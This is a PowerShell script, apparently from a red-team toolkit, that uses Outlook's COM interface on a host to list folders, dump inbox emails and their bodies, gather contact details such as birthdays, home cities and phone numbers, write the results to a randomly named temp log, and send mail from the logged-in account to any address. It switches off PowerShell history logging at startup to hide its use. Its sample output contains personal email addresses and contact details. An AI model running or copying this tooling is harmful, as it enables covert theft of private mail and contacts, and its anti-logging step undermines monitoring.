<#
.SYNOPSIS
   Read outLook Exchange Emails

   Author: @r00t-3xp10it
   Tested Under: Windows 10 (19043) x64 bits
   Required Dependencies: Outlook ComObject {native}
   Optional Dependencies: none
   PS cmdlet Dev version: v2.2.9

.DESCRIPTION
   CmdLet to enumerate OutLook Exchange Emails, read is contents
   on terminal console or dump found Email Objects to a logfile.

.NOTES
   This Cmdlet will try to stop OUTLOOK process in the end of execution.
   If invoked -verb 'true' param then Email(s) <Body> will be displayed.

   Cmdlet default settings is to display the first 5 Objects, But ..
   that can be changed with the help of -maxItems 'int' parameter.

   The parameter -filter 'Google' can be invoked together with -action
   'enum' to filter only 'Google' Exchange Emails Objects. Remark: Filter
   parameter limmits the search to a 10 max Objects (for fast reports)

.Parameter Action
   Accepts arguments: enum, folders, contacts, send (default: enum)

.Parameter MaxItems
   How many outlook item objects to display (default: 5)

.Parameter Filter
   Filter Objects by is 'SenderName'? (default: false)

.Parameter Verb
   Display verbose outputs <Body> (default: false)

.Parameter SendTo
   The Email Addr to send mail (default: LocalAddr@outlook.com)

.Parameter SendSubject
   The Email subject (title) to send (default: SSA_redTeam Email)

.Parameter SendBody
   The Email body message to send (default: testing Send function)

.Parameter Logfile
   Create report logfile? (default: false)

.EXAMPLE
   PS C:\> .\ReadEmails.ps1 -action 'folders'
   Enumerate OutLook Exchange Folders

.EXAMPLE
   PS C:\> .\ReadEmails.ps1 -action 'enum'
   Enumerate (5 = default) OutLook Exchange Emails

.EXAMPLE
   PS C:\> .\ReadEmails.ps1 -action 'contacts'
   Enumerate (5) OutLook Exchange Contact Objects

.EXAMPLE
   PS C:\> .\ReadEmails.ps1 -action 'enum' -MaxItems '10'
   Enumerate (10) OutLook Exchange Emails (non-verbose)

.EXAMPLE
   PS C:\> .\ReadEmails.ps1 -action 'enum' -MaxItems '2' -filter 'Google'
   Enumerate (2) OutLook Exchange Emails only with (Google SenderName set)

.EXAMPLE
   PS C:\> .\ReadEmails.ps1 -action 'enum' -MaxItems '3' -verb 'true'
   Enumerate (3) OutLook Exchange Emails in verbose mode (Email <BODY>)

.EXAMPLE
   PS C:\> .\ReadEmails.ps1 -action 'enum' -logfile 'true'
   Enumerate (5) OutLook Exchange Emails and create logfile

.INPUTS
   None. You cannot pipe objects into ReadEmails.ps1

.OUTPUTS
   * Read Exchange Emails with PowerShell ..

   ItemsCount         : '5694'          
   RegisteredUser     : pedroubuntu10@gmail.com
   -------------------------------------
   SenderName         : Odyssey Hotels
   SenderEmailAddress : info@newsletter.odisseias.com
   TaskSubject        : Suite + Hot Tub? promotion  💑
   To                 : pedroubuntu10@gmail.com
   SentOn             : 11/01/2022 08:41:07
   ReceivedTime       : 11/01/2022 09:49:07
   UnRead             : True
   Links              : 

   SenderName         : Uber Eats
   SenderEmailAddress : uber@uber.com
   TaskSubject        : Enjoy your favorite dishes in bed with Uber Eats. 🥞
   To                 : pedroubuntu10@gmail.com
   SentOn             : 12/01/2022 08:06:09
   ReceivedTime       : 12/01/2022 08:06:11
   UnRead             : True
   Links              : 

   * Stoping OUTLOOK process Id:6604[OK]

.LINK
   https://github.com/r00t-3xp10it/redpill
   http://squareclouds.net/exporting-outlook-contacts-with-powershell
   https://sqlnotesfromtheunderground.wordpress.com/2014/09/06/by-example-powershell-commands-for-outlook
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$SendBody="testing Send function.",
   [string]$SendSubject="SSA_redTeam Email",
   [string]$SendTo="recipient@test.com",
   [string]$Logfile="false",
   [string]$Filter="false",
   [string]$Action="enum",
   [string]$Verb="false",
   [string]$Egg="false",
   [int]$MaxItems='5'
)

write-host ""
$CmdletVersion = "v2.2.9"
#Local variable declarations
$GetProcessStateDelay = "500"
$LocalPath = (Get-Location).Path
$ErrorActionPreference = "SilentlyContinue"
#Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null
$host.UI.RawUI.WindowTitle = "@ReadEmails $CmdletVersion {SSA@RedTeam}"
$RegisteredUser = (Get-CimInstance -ClassName Win32_OperatingSystem).RegisteredUser
$Rand = -join (((48..57)+(65..90)+(97..122)) * 80 |Get-Random -Count 8 |%{[char]$_})


If($Egg -ieq "False")
{
   If($Action -iMatch 'Send'){$CmdFunction = "Send"}Else{$CmdFunction = "Read"}
   Write-Host "`n* $CmdFunction Exchange Emails with PowerShell" -ForegroundColor Green
}
#Read Exchange Emails with PowerShell
$outlook = New-Object -ComObject outlook.application
$olFolders ="Microsoft.Office.Interop.Outlook.OlDefaultFolders" -as [type]
$namespace = $Outlook.GetNameSpace("MAPI")
$inbox = $namespace.GetDefaultFolder($olFolders::olFolderInbox)
$ITemsInside = $inbox.items.count


If($Action -ieq "Folders")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Display Outlook Folder Names

   .OUTPUTS
      * Read Exchange Emails with PowerShell

      Name                                FolderPath                                                                          
      ----                                ----------                                                                          
      Caixa de Entrada                    \\pedroubuntu10@gmail.com\Caixa de Entrada                                          
      A enviar                            \\pedroubuntu10@gmail.com\A enviar                                                  
      Rascunhos                           \\pedroubuntu10@gmail.com\Rascunhos                                                 
      Feeds RSS (Apenas este computador)  \\pedroubuntu10@gmail.com\Feeds RSS (Apenas este computador)                             
      [Gmail]                             \\pedroubuntu10@gmail.com\[Gmail]                                                   
      Pessoal                             \\pedroubuntu10@gmail.com\Pessoal                                                   
      Recibos                             \\pedroubuntu10@gmail.com\Recibos                                                   
      Trabalho                            \\pedroubuntu10@gmail.com\Trabalho

      * Stoping OUTLOOK process Id:6604[OK]
   #>

   $i = 1 #ProgressBar
   $DefaultFolderName = ($inbox).Name #Default Inbox Name Object
   $TerminalDisplay = $namespace.Folders.Item(1).Folders | Select-Object Name,FolderPath 
   $TerminalDisplay | ForEach-Object {#Displaying ProgressBar
       Write-Progress -Activity "Listing OutLook Folders" -Status "Object $i of $($TerminalDisplay.Count)" -PercentComplete (($i / $TerminalDisplay.Count) * 100)  
       Start-Sleep -Milliseconds 50
       $i++
   }

   #Display OnScreen Outlook Folder Names
   echo $TerminalDisplay | Format-Table -AutoSize | Out-String -Stream | ForEach-Object {
      $stringformat = If($_ -Match '^(Name)')
      {
         @{ 'ForegroundColor' = 'Green' }
      }
      ElseIf($_ -Match "($DefaultFolderName|\[Gmail\])")
      {
         @{ 'ForegroundColor' = 'Yellow' }      
      }
      Else
      {
         @{ 'ForeGroundColor' = 'white' }
      }
      Write-Host @stringformat $_
   }

}


If($Action -ieq "Contacts")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Credits: @chrisprevel
      Helper - Display Outlook Contacts Information

   .OUTPUTS
      * Read Exchange Emails with PowerShell

      ShowItemCount       : 1
      CustomViewsOnly     : False
      DefaultMessageClass : IPM.Contact
      AddressBookName     : Contactos (Apenas este computador)
      FullFolderPath      : \\pedroubuntu10@gmail.com\Contactos (Apenas este computador)
      ContactItemsFound   : 1
      Items               : 

      FullName            : Ines Santos
      CompanyName         : SSA_redteam_@2022
      Department          : IT security
      JobTitle            :
      Anniversary         : 14/05/1985 00:00:00
      Birthday            : 14/05/1985 00:00:00
      Email1Address       : InesSantos154@gmail.com 
      BusinessAddressCity :
      HomeAddressStreet   :
      HomeAddressCity     : Lisboa
      HomeAddressState    :
      HomeTelephoneNumber : 9142349210

      * Stoping OUTLOOK process Id:6604[OK]
   #>

   $IdCounter = 0        #ContactsId
   $CurrentItem = 0      #ProgressBar
   $PercentComplete = 0  #ProgressBar

   $ContactsInfo = $outlook.session.GetDefaultFolder(10)
   $TotalItems = $ContactsInfo.Count #ProgressBar

   ForEach($Token in $ContactsInfo)
   {
      $CurrentItem++
      $PercentComplete = [int](($CurrentItem / $TotalItems) * 100)
      Write-Progress -Activity "Checking OutLook Contacts" -Status "$PercentComplete% Complete:" -PercentComplete $PercentComplete
      Start-Sleep -Milliseconds 35
   }

   #Display OnScreen Outlook Contacts Information
   $ContactsInfo | Format-List ShowItemCount,CustomViewsOnly,DefaultMessageClass,AddressBookName,FullFolderPath |
   Out-String -Stream | Select-Object -Skip 2 | Select-Object -SkipLast 3 | ForEach-Object {
      $stringformat = If($_ -Match '^(AddressBookName)')
      {
         @{ 'ForegroundColor' = 'Green' }
      }
      ElseIf($_ -Match '^(DefaultMessageClass)')
      {
         @{ 'ForegroundColor' = 'DarkGray' }   
      }
      ElseIf($_ -Match '^(FullFolderPath)')
      {
         @{ 'ForegroundColor' = 'Yellow' }   
      }
      Else
      {
         @{ 'ForeGroundColor' = 'white' }
      }
      Write-Host @stringformat $_
   }

   #Store the Contacts objects
   $Contacts = $outlook.session.GetDefaultFolder(10).items
   #Store the folder objects
   $Contactsfolders = $outlook.session.GetDefaultFolder(10).Folders
   Start-Sleep -Milliseconds 800

   #Make sure we have any returned Object
   If([string]::IsNullOrEmpty($Contacts) -and [string]::IsNullOrEmpty($Contactsfolders))
   {
      write-host "*" -ForegroundColor Red -NoNewline;
      write-host " Error: " -ForegroundColor DarkGray -NoNewline;
      write-host "fail to retrieve Contacts from OutLook?" -ForegroundColor Red -BackgroundColor Black
      #Remark: Let CmdLet finish to stop OutLook process
   }
   Else
   {
      #Contacts folder exemption
      $folderexempt1 = "*Recipient*"
      #Create array for nested contacts (within folders)
      $ContactsNested = @()

      For ($i = 1;$i -le $ContactFolders.count;$i++)
      {

         <#
         .SYNOPSIS
            Author: @chrisprevel
            Helper - Get Outlook Contacts Information
            http://squareclouds.net/exporting-outlook-contacts-with-powershell

         .NOTES
            The script block cycles through each Object in the Item array where the Object
            name is not like the exemption and we add this to the variable $conectsnested
         #>

         $ContactsFoldersItems = $ContactFolders.Item($i) | Where-Object {($_.Name -notlike "$folderexempt1")}
         $ContactsNested += $ContactsFoldersItems.Items
      }

      ## Add the contacts within the contact
      # folders to the original $Contacts variable.
      $Contacts += $Contactsnested
      $TerMinalOutPut = $Contacts | Select-Object -First $MaxItems

      #Count how many found in addres book query
      ForEach($Token in $TerMinalOutPut)
      {
         $IdCounter++
      }

      #Select attributes from Contacts
      write-host "ContactItemsFound   : $IdCounter" -ForegroundColor DarkGray;
      write-host "Items               :";write-host "";Start-Sleep -Milliseconds 1400
      $TerMinalOutPut | Select-Object FullName,CompanyName,Department,JobTitle,Anniversary,Birthday,Email1Address,BusinessAddressCity,HomeAddressStreet,HomeAddressCity,HomeAddressState,HomeTelephoneNumber | Format-list | Out-String -Stream | Select-Object -Skip 2 | ForEach-Object {
         $stringformat = If($_ -Match '^(FullName|Email1Address)')
         {
            @{ 'ForegroundColor' = 'Yellow' }
         }
         Else
         {
            @{ 'ForeGroundColor' = 'white' }
         }
         Write-Host @stringformat $_
      }
   }
}


If($Action -ieq "Enum")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Display Outlook Exchange Email Items!

   .NOTES
      The parameter -filter 'Google' can be invoked together with
      -action 'enum' to filter only 'Google' Exchange Emails Objects ..
      Remark: Filter param limmits the search to 10 Objects (fast reports)

   .OUTPUTS
      * Read Exchange Emails with PowerShell ..

      ItemsCount         : '5694'          
      RegisteredUser     : pedroubuntu10@gmail.com
      -------------------------------------
      SenderName         : Odyssey Hotels
      SenderEmailAddress : info@newsletter.odisseias.com
      TaskSubject        : Suite + Hot Tub? promotion  💑
      To                 : pedroubuntu10@gmail.com
      SentOn             : 11/01/2022 08:41:07
      ReceivedTime       : 11/01/2022 09:49:07
      UnRead             : True
      Links              : 

      SenderName         : Uber Eats
      SenderEmailAddress : uber@uber.com
      TaskSubject        : Enjoy your favorite dishes in bed with Uber Eats. 🥞
      To                 : pedroubuntu10@gmail.com
      SentOn             : 12/01/2022 08:06:09
      ReceivedTime       : 12/01/2022 08:06:11
      UnRead             : True
      Links              : 

      * Stoping OUTLOOK process Id:6604[OK]
   #>

   #Display OnScreen how many item does outlook as
   Write-Host "`nOutlook Items      : '$ITemsInside'           " -ForegroundColor black -BackgroundColor DarkGray
   Write-Host "RegisteredUser     : $RegisteredUser" -ForegroundColor black -BackgroundColor DarkGray
   write-host "--------------------------------------"

   If($verb -ieq "True")
   {
      If($Filter -ne "False")
      {
         If($MaxItems -gt 10){$MaxItems = "10"} #Limmit the search to 10 max Objects for fast reports
         $TerminalDisplay = $inbox.items | Select-Object SenderName,SenderEmailAddress,TaskSubject,To,SentOn,ReceivedTime,ExpiryTime,UnRead,SenderEmailType,Links,ConversationID,Body | Where-Object { $_.SenderName -iMatch "$Filter" } | Select-Object -First $MaxItems
      }
      Else
      {
         $TerminalDisplay = $inbox.items | Select-Object SenderName,SenderEmailAddress,TaskSubject,To,SentOn,ReceivedTime,ExpiryTime,UnRead,SenderEmailType,Links,ConversationID,Body | Select-Object -First $MaxItems      
      }
   }
   Else
   {
      If($Filter -ne "False")
      {
         If($MaxItems -gt 10){$MaxItems = "10"} #Limmit the search to 6 Objects for fast reports
         $TerminalDisplay = $inbox.items | Select-Object SenderName,SenderEmailAddress,TaskSubject,To,SentOn,ReceivedTime,UnRead,Links | Where-Object { $_.SenderName -iMatch "$Filter" } | Select-Object -First $MaxItems
      }
      Else
      {
         $TerminalDisplay = $inbox.items | Select-Object SenderName,SenderEmailAddress,TaskSubject,To,SentOn,ReceivedTime,UnRead,Links | Select-Object -First $MaxItems      
      }
   }


   $i = 1 #ProgressBar
   $TotalItems = $TerminalDisplay.Count #ProgressBar
   $TerminalDisplay | ForEach-Object {#Displaying ProgressBar
       Write-Progress -Activity "Listing OutLook Email Objects" -Status "Object $i of $($TerminalDisplay.Count)" -PercentComplete (($i / $TerminalDisplay.Count) * 100)  
       Start-Sleep -Milliseconds 300
       $i++
   }

   #Display onscreen email objects found
   echo $TerminalDisplay | Format-List | Out-String -Stream | Select-Object -Skip 2 | ForEach-Object {
      $stringformat = If($_ -Match '^(SenderEmailAddress)')
      {
         @{ 'ForegroundColor' = 'Green' }
      }
      ElseIf($_ -Match '^(To)')
      {
         @{ 'ForegroundColor' = 'Yellow' }   
      }
      ElseIf($_ -Match '^(TaskSubject)')
      {
         @{ 'ForegroundColor' = 'DarkGray' }  
      }
      Else
      {
         @{ 'ForeGroundColor' = 'white' }
      }
      Write-Host @stringformat $_
   }

}


If($Action -ieq "Send")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Use Local PC OUTLOOK to Send Email

   .NOTES
      This function allow us to Send Emails from local PC to an external Email addr
      Example: Send Email from 'LocalAddr@outlook.com' to 'ExternalAddress@gmail.com'
      If invoked -SendTo 'recipient@test.com' then cmdlet uses 'LocalAddr@outlook.com'
      to send a demonstration Email message to 'LocalAddr@outlook.com' recipent (local)

   .EXAMPLE
      PS C:\> .\ReadEmails.ps1 -action 'send' -SendTo 'ExternalAddr@gmail.com' -SendSubject 'SSA_redTeam Email' -SendBody 'testing Send function.'

   .OUTPUTS
      * Send Exchange Emails with PowerShell ..

      SendFrom    : recipient@test.com
      SendTo      : ExternalAddr@gmail.com
      SendSubject : SSA_redTeam Email
      SendBody    : testing Send function

      * Quit OUTLOOK and release our COM Object[OK]
   #>

   write-host ""
   #Use the Demonstration Send Function!
   If($SendTo -iMatch '^(recipient@test.com)$')
   {
      write-host "SendTo: '" -NoNewline;
      write-host "$RegisteredUser" -ForegroundColor Green -NoNewline;
      write-host "' recipient (demo)`n";
      $SendTo = "$RegisteredUser" #Use Local address for demo
   }


   #Create a new Outlook MailItem
   $SendMail = $outlook.CreateItem(0)

   #Add Properties
   $SendMail.To = "$SendTo"
   $SendMail.Subject = "$SendSubject"
   $SendMail.Body = "$SendBody"

   #Build Output Table
   write-host "SendFrom    : $RegisteredUser"
   write-host "SendTo      : $SendTo" -ForegroundColor Green
   write-host "SendSubject : $SendSubject" -ForegroundColor DarkGray
   write-host "SendBody    : $SendBody"

   ## use a MailItem method
   # to send our message.
   $SendMail.Send()

   $outlook.Quit()
   ## Stop OUTLOOK process and release our COM
   # Object when we are finished to free up memory.
   write-host "`n* " -ForegroundColor Green -NoNewline;
   write-host "Quit OUTLOOK and release our COM Object" -ForegroundColor DarkGray -NoNewline;
   Start-Sleep -Milliseconds 800;write-host "[" -ForegroundColor DarkGray -NoNewline;
   write-host "OK" -ForegroundColor Green -NoNewline;
   write-host "]`n" -ForegroundColor DarkGray;
   [System.Runtime.Interopservices.Marshal]::ReleaseComObject($outlook)|Out-Null
   exit
}


If($Logfile -ieq "True")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Create report logfile

   .NOTES
      The logfile will be created in %tmp% directory
   #>

   $LogName = "${Env:TMP}\${Rand}" + ".log" -join ''
   echo "* Read Exchange Emails with PowerShell .." > $LogName
   echo "OutLook Items      : $ITemsInside" >> $LogName
   echo "RegisteredUser     : $RegisteredUser" >> $LogName
   echo "------------------------------------" >> $LogName

   If($Action -ieq "Contacts")
   {
      $Primeiro = $TerMinalOutPut | Format-List FullName,CompanyName,Department,JobTitle,Anniversary,Birthday,Email1Address,BusinessAddressCity,HomeAddressStreet,HomeAddressCity,HomeAddressState,HomeTelephoneNumber
      $Final = $ContactsInfo | Format-List ShowItemCount,CustomViewsOnly,DefaultMessageClass,AddressBookName,FullFolderPath,@{Name='Items';Expression={''}}
      echo $Final >> $LogName
      echo $Primeiro >> $LogName
   }
   Else
   {
      echo $TerminalDisplay >> $LogName
   }

   Write-Host "*" -ForegroundColor Green -NoNewline;
   Write-Host " Logfile created: '" -ForegroundColor DarkGray -NoNewline;
   Write-Host "$LogName" -ForegroundColor Green -NoNewline;
   Write-Host "'" -ForegroundColor DarkGray;
}



<#
.SYNOPSIS
   Author: @r00t-3xp10it
   Helper - Stop OUTLOOK process by is Id identifier
#>
[string]$GetOutLookProcessPid = (Get-Process -Name * | Where-Object { $_.ProcessName -iMatch '^(OUTLOOK)$'} ).Id | Select-Object -Last 1
If([string]::IsNullOrEmpty($GetOutLookProcessPid))
{
   write-host "[ERROR] CmdLet cant find a valid OUTLOOK Pid .." -ForegroundColor Red -BackgroundColor Black
   write-host "The OUTLOOK appl will require manual shutdown .." -ForegroundColor DarkGray
}
Else
{
   try{#Stop OUTLOOK process
      write-host "*" -ForegroundColor Green -NoNewline;
      write-host " Stoping OUTLOOK process Id:" -ForegroundColor DarkGray -NoNewline;
      write-host "$GetOutLookProcessPid" -ForegroundColor Green -NoNewline;

      ## Stop OUTLOOK process
      Stop-Process -Id "$GetOutLookProcessPid" -EA SilentlyContinue -Force|Out-Null
      Start-Sleep -Milliseconds "$GetProcessStateDelay"

      If((Get-Process -Id "$GetOutLookProcessPid" -EA SilentlyContinue).Responding -ieq "True")
      {
         write-host "[" -ForegroundColor DarkGray -NoNewline;
         write-host "FAIL" -ForegroundColor Red -BackGroundColor Black -NoNewline;
         write-host "]" -ForegroundColor DarkGray;      
      }
      Else
      {
         write-host "[" -ForegroundColor DarkGray -NoNewline;
         write-host "OK" -ForegroundColor Green -NoNewline;
         write-host "]" -ForegroundColor DarkGray;      
      }
   }catch{
      write-host "[ERROR] Fail to stop OUTLOOK process by is Id .." -ForegroundColor Red -BackgroundColor Black   
   }
}
Write-Host ""